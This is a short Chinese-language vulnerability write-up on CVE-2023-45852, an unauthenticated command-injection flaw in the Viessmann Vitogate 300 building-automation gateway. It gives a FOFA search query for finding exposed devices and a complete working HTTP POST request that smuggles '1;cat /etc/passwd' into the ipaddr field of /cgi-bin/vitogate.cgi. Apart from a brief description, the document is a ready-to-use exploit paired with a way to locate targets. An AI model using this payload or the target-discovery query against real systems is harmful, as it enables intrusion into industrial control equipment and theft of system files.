# Viessmann Vitogate RCE 漏洞（CVE-2023-45852）

# 一、漏洞简介
Viessmann Vitogate 300是用于将Viessmann LON连接到BACnet或Modbus的网关。Vitogate 300组件/cgi-bin/vitogate.cgi中的一个问题允许未经身份验证的攻击者绕过身份验证，通过特制的请求执行任意命令，可导致服务器失陷。

# 二、影响版本
+ Viessmann Vitogate 300

# 三、资产测绘
+ fofa`app=”Vitogate-300”`
+ 特征

![1707059485948-359f6933-eb77-4147-aa79-353f587ead29.png](./img/6dQ4EvIoNFpWhwei/1707059485948-359f6933-eb77-4147-aa79-353f587ead29-940674.png)

# 四、漏洞复现
```plain
POST /cgi-bin/vitogate.cgi HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: langCookie=en
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 87

{"method":"put","form":"form-4-8","session":"","params":{"ipaddr":"1;cat /etc/passwd"}}
```

![1707059530155-faca9058-dfe5-4cf3-819c-73e8e71af6df.png](./img/6dQ4EvIoNFpWhwei/1707059530155-faca9058-dfe5-4cf3-819c-73e8e71af6df-407474.png)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/llhplei5z29a1kqg>